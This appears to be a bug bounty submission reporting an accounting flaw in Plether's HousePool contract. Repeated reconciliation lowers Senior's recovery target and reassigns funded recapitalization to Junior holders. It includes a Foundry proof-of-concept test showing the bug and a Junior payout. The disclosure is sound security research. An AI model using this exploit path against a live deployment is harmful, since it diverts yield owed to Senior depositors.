# \#100053 [SC-High] Repeated settlement lowers Senior's recovery target and reassigns funded recapitalization

**Submitted on Nov 16th 2026 at 06:53:56 UTC by @iam0x04 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #100053
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Brief/Intro

When a recapitalization is only partially settleable and its residual is large enough to reserve all attributed principal, a later reconciliation with no economic change temporarily wipes Senior and treats the residual as a new bootstrap. This replaces the original high-water mark with the smaller residual. Further unchanged reconciliations repeat the ratchet while the same zero-principal condition remains reachable.

Any successful LP epoch settlement reconciles first, so existing matured redemption work can trigger the bug incidentally. An unprivileged Junior holder can also trigger it on demand by advancing matured zero-value redemption epochs. The hourly boundary alone does not execute settlement. Once the high-water mark has been lowered, later revenue—and recapitalization backing released by a reduction in trader claims—can be allocated to Junior instead of Senior.

## Vulnerability Details

[`HousePool._reconcile`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1555-L1601) reads the complete pending buckets, caps them against the current distributable equity, and passes the capped amount to `planReconcile`. [`_settleablePendingClaimantBuckets`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1829-L1834) performs this cap independently on every reconciliation; it does not distinguish backing already attributed to Senior in a previous partial settlement.

[`HousePoolReconcilePlanLib.planReconcile`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L104) subtracts the capped pending amount from ordinary distributable equity before reconciling the waterfall. On the second reconciliation, this removes the same backing again and makes the previously credited Senior principal appear lost.

The resulting in-memory state has zero Senior and Junior principal. [`applyClaimantRecapitalizationIntent`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L103-L137) interprets any such state with Senior supply as a fresh bootstrap and sets the high-water mark to `max(recapitalizationTargetAssets, amount)`. Because the target is now only the residual pending amount, it overwrites the larger target established by the first settlement. [`_applyPendingClaimantBucketsLive`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1759-L1776) then decrements the pending bucket and persists the lowered high-water mark.

The [accounting specification](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L329-L340) states that losses do not reduce the Senior high-water mark and that later revenue restores Senior first. The existing [partial-recapitalization test](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/waterfall/HousePoolWaterfall.t.sol#L177-L202) likewise preserves the complete recapitalization target while a residual is pending.


## Impact Details

Repeated reconciliation can lower Senior’s high-water mark without any Senior withdrawal or new economic loss. In the PoC, an unchanged checkpoint lowers the HWM from 100,000 to 50,000. Consequently, subsequent revenue that should restore Senior is assigned to Junior instead. The maximum stolen unclaimed yield is bounded by the Senior recovery entitlement erased through these repeated resets.

The impact is redeemable. After the corrupted checkpoint, consuming a 50,000 trader claim without transferring Pool cash produces `Senior = 50,000, Junior = 50,000`; the correct result is `Senior = 100,000, Junior = 0`. An ordinary Junior holder then redeems 24,999.657515 tokens through the real asynchronous withdrawal path.

An attacker can force the corrupting checkpoint using matured zero-value redemption epochs, while the later revenue or claim consumption may arise from normal independent activity. The demonstrated reset requires residual recapitalization sufficient to temporarily reduce all attributed principal to zero (`R >= 2N` in the PoC vector). The issue does not mint tokens, freeze funds, or cause insolvency.



## Proof of Concept

## Proof of Concept

Save the following test as `packages/perps/test/perps/accounting/waterfall/ResidualRecapitalizationHwmReset.t.sol`.

The test uses the real `CfdEngine.recapitalizePool()`, `HousePool` allocation logic, authorized claim-consumption hook, and asynchronous Junior payout path.

It synthetically burns the fixture balance and seeds matching account and aggregate trader claims with Foundry storage tooling. The future-revenue branch directly mints fixture tokens and impersonates the Engine to call `HousePool.recordClaimantInflow()`, validating real HousePool revenue routing but not production revenue generation. It directly invokes vault-authorized reconciliation and the configured settlement sidecar, so it does not reproduce claim creation, a losing trade, or the public dust trigger. It includes a correct-path control, a future-revenue assertion, the funded-cash payout, and the repeated-ratchet vector. No RPC, fork, credentials, or third-party service is used.

From the repository root at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, initialize the pinned submodules and run:

```sh
git submodule update --init --recursive
forge test --root packages/perps --offline --match-contract ResidualRecapitalizationHwmResetTest -vv
```

Expected result: **2 passed, 0 failed**. The control restores `Senior = 100,000, Junior = 0`; adding the erroneous checkpoint instead lowers HWM to 50,000, routes future revenue to Junior, and after no-cash claim consumption assigns 50,000 of released equity to Junior. An ordinary Junior holder redeems approximately 25,000. The second test demonstrates the conditional `100,000 → 80,000 → 60,000 → 40,000 → 20,000` ratchet.

```text
Senior HWM before repeated reconciliation: 100000000000
Senior HWM after repeated reconciliation:   50000000000
Existing recapitalization assigned to Junior: 50000000000
Junior holder payout:                         24999657515
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";

import {StdStorage, stdStorage} from "forge-std/StdStorage.sol";

import {HousePoolTestBase} from "../../shared/HousePoolTestBase.sol";

contract ResidualRecapitalizationHwmResetTest is HousePoolTestBase {

    using stdStorage for StdStorage;

    function test_RepeatedReconcileLowersSeniorRecoveryTargetWithoutEconomicChange() public {
        // Give a non-seed Junior holder an ordinary, redeemable position.
        _fundJunior(alice, 1000e6);

        // Wipe the seeded LP principal while leaving the seeded share supplies in place.
        settlementToken.burn(address(pool), pool.totalAssets());
        vm.prank(address(juniorVault));
        pool.reconcile();

        assertEq(pool.seniorPrincipal(), 0);
        assertEq(pool.juniorPrincipal(), 0);
        assertGt(seniorVault.totalSupply(), 0);

        uint256 recapitalization = 100_000e6;
        uint256 traderClaim = 50_000e6;
        uint256 settleableRecapitalization = recapitalization - traderClaim;

        _recapitalize(recapitalization);
        address claimant = address(0xCA11);
        _setSyntheticTraderClaim(claimant, traderClaim);

        // The first partial settlement correctly preserves the complete recapitalization
        // intent as Senior's recovery target.
        vm.prank(address(seniorVault));
        pool.reconcile();

        assertEq(pool.seniorPrincipal(), settleableRecapitalization);
        assertEq(pool.juniorPrincipal(), 0);
        assertEq(pool.seniorHighWaterMark(), recapitalization);
        assertEq(pool.pendingRecapitalizationAssets(), traderClaim);

        // Control: releasing the claim before an extra checkpoint completes the
        // intended Senior recapitalization and gives Junior nothing.
        uint256 controlSnapshot = vm.snapshotState();
        vm.prank(address(engine.settlementSidecar()));
        engine.settlementConsumeTraderClaim(claimant, traderClaim);
        vm.prank(address(seniorVault));
        pool.reconcile();
        assertEq(pool.seniorPrincipal(), recapitalization);
        assertEq(pool.juniorPrincipal(), 0);
        assertTrue(vm.revertToState(controlSnapshot));

        uint256 poolBalanceBefore = settlementToken.balanceOf(address(pool));
        uint256 traderClaimBefore = engine.totalTraderClaimBalanceAssets();

        // No cash, liability, position, price, or withdrawal changes before the second
        // checkpoint. Only the same residual recapitalization is reconciled again.
        vm.prank(address(seniorVault));
        pool.reconcile();

        assertEq(settlementToken.balanceOf(address(pool)), poolBalanceBefore);
        assertEq(engine.totalTraderClaimBalanceAssets(), traderClaimBefore);
        assertEq(pool.seniorPrincipal(), settleableRecapitalization);
        assertEq(pool.juniorPrincipal(), 0);

        // BUG: the second checkpoint lowers the HWM from the complete 100,000-token
        // intent to the current 50,000-token residual. It should remain unchanged.
        assertEq(pool.seniorHighWaterMark(), traderClaim);
        assertLt(pool.seniorHighWaterMark(), recapitalization);
        assertEq(pool.pendingRecapitalizationAssets(), 0);

        // The corrupted HWM also routes subsequently recorded revenue to Junior.
        uint256 corruptedSnapshot = vm.snapshotState();
        uint256 futureRevenue = 100e6;
        settlementToken.mint(address(pool), futureRevenue);
        vm.prank(address(engine));
        pool.recordClaimantInflow(
            futureRevenue, IHousePool.ClaimantInflowKind.Revenue, IHousePool.ClaimantInflowCashMode.CashArrived
        );
        vm.prank(address(seniorVault));
        pool.reconcile();
        assertEq(pool.seniorPrincipal(), settleableRecapitalization);
        assertEq(pool.juniorPrincipal(), futureRevenue);
        assertTrue(vm.revertToState(corruptedSnapshot));

        // Consume the claim through the production settlement hook. This releases the
        // already-funded recapitalization without transferring any cash out of the pool.
        vm.prank(address(engine.settlementSidecar()));
        engine.settlementConsumeTraderClaim(claimant, traderClaim);

        assertEq(engine.traderClaimBalanceAssets(claimant), 0);
        assertEq(engine.totalTraderClaimBalanceAssets(), 0);
        assertEq(settlementToken.balanceOf(address(pool)), poolBalanceBefore);

        vm.prank(address(seniorVault));
        pool.reconcile();

        uint256 recapitalizationReassignedToJunior = recapitalization - settleableRecapitalization;
        assertEq(pool.seniorPrincipal(), settleableRecapitalization);
        assertEq(pool.juniorPrincipal(), recapitalizationReassignedToJunior);

        // The ordinary Junior holder can redeem owner-funded recapitalization that should
        // have restored Senior. This uses the actual asynchronous request, funding, and claim path.
        _finishAsyncCooldown(juniorVault, alice);
        uint256 aliceShares = juniorVault.balanceOf(alice);
        uint256 aliceBalanceBefore = settlementToken.balanceOf(alice);
        (, uint256 fundedShares, uint256 redeemedAssets) = _redeemAsync(juniorVault, alice, aliceShares, false);

        assertEq(fundedShares, aliceShares);
        assertGt(redeemedAssets, 0);
        assertEq(settlementToken.balanceOf(alice), aliceBalanceBefore + redeemedAssets);

        emit log_named_uint("Senior HWM before repeated reconciliation", recapitalization);
        emit log_named_uint("Senior HWM after repeated reconciliation", traderClaim);
        emit log_named_uint("Existing recapitalization assigned to Junior", recapitalizationReassignedToJunior);
        emit log_named_uint("Junior holder payout", redeemedAssets);
    }

    function test_UnchangedReconciliationsRatchetHwmWhileResidualCoversEquity() public {
        settlementToken.burn(address(pool), pool.totalAssets());
        vm.prank(address(juniorVault));
        pool.reconcile();

        uint256 recapitalization = 100_000e6;
        uint256 distributableEquity = 20_000e6;
        uint256 traderClaim = recapitalization - distributableEquity;

        _recapitalize(recapitalization);
        _setSyntheticTraderClaim(address(0xCA12), traderClaim);

        vm.prank(address(seniorVault));
        pool.reconcile();
        assertEq(pool.seniorPrincipal(), distributableEquity);
        assertEq(pool.seniorHighWaterMark(), recapitalization);

        for (uint256 expectedHwm = 80_000e6; expectedHwm >= 20_000e6; expectedHwm -= 20_000e6) {
            vm.prank(address(seniorVault));
            pool.reconcile();

            assertEq(pool.seniorPrincipal(), distributableEquity);
            assertEq(pool.seniorHighWaterMark(), expectedHwm);

            if (expectedHwm == 20_000e6) {
                break;
            }
        }

        assertEq(pool.pendingRecapitalizationAssets(), 0);
    }

    function _setSyntheticTraderClaim(
        address claimant,
        uint256 amount
    ) internal {
        stdstore.target(address(engine)).sig("traderClaimBalanceAssets(address)").with_key(claimant)
            .checked_write(amount);
        _setTotalTraderClaim(amount);
    }

    function _recapitalize(
        uint256 amount
    ) internal {
        settlementToken.mint(address(this), amount);
        settlementToken.approve(address(engine), amount);
        engine.recapitalizePool(amount);
    }

}

```
